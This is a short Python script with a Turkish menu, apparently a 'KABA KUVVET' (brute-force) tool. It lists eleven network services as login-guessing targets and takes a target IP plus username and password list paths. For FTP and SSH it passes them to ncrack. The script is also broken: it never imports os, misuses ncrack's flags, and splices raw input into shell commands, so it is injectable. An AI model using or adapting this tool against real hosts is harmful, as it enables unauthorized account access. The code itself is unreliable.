#!/usr/bin/env python
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet KABA KUVVET")

print("""
KABA KUVVET aracına hosgeldiniz.
1)FTP
2)SSH
3)Telnet
4)HTTP
5)SMB
6)R0P
7)SIP
8)Redis
9)VNC
10)PostgreSQL
11)MySql

""")
islemno= raw_input("İşlem Numarasini Girin: ")
hedefip= raw_input("Hedef Ip Gİrin: ")
kullaniciadı = raw_input("Kullanici Adi Dosya Yolu: ")
sifre = raw_input("Sifrelerin Bulundugu DOsya Yolu: ")
if(islemno=="1"):
    os.system("ncrack -p 21 -u "+ kullaniciadı + " -p " + sifre + " " + hedefip)
elif(islemno=="2"):
    os.system("ncrack -p 22 -u "+ kullaniciadı + " -p " + sifre + " " + hedefip)



